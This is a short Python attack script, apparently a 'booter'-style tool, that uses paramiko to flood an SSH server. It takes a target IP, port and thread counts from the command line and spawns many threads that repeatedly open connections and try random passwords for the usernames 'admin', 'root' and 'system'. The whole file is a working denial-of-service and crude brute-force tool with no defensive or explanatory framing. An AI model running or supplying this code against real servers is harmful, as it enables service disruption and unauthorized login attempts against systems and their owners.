import paramiko,sys
import random,threading

def SSH_FLOOD(IP,PORT,user,PWD,BOOTER):
    client = paramiko.SSHClient()
    for _ in range(BOOTER):
        try:
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(IP, port=PORT)
         client.connect(IP, port=PORT,username=user,password=PWD)
        except:
         pass

def genPass(ltrs, length):
    s = ''.join(random.choices(ltrs, k=length))
    return s

def FLOODING(IP,PORT,TIME,SIZE,BOOTER,CREATE_THR):
    for _ in range(TIME):
        user = random.choice(("admin","root","system"))
        pwd = genPass("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~)-$(@#", SIZE)
        for _ in range(CREATE_THR):
           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
           threading.Thread(target=SSH_FLOOD,args=(IP,PORT,user,pwd,BOOTER)).start()
IP = ''
PORT =0
TIME = 0
SIZE = 0
BOOTER = 0
THR_C = 0

if len(sys.argv) == 7:
    IP = str(sys.argv[1])
    PORT = int(sys.argv[2])
    TIME = int(sys.argv[3])
    SIZE = int(sys.argv[4])
    BOOTER = int(sys.argv[5])
    THR_C = int(sys.argv[6])
else:
    exit()

threading.Thread(target=FLOODING,args=(IP,PORT,TIME,SIZE,BOOTER,THR_C)).start()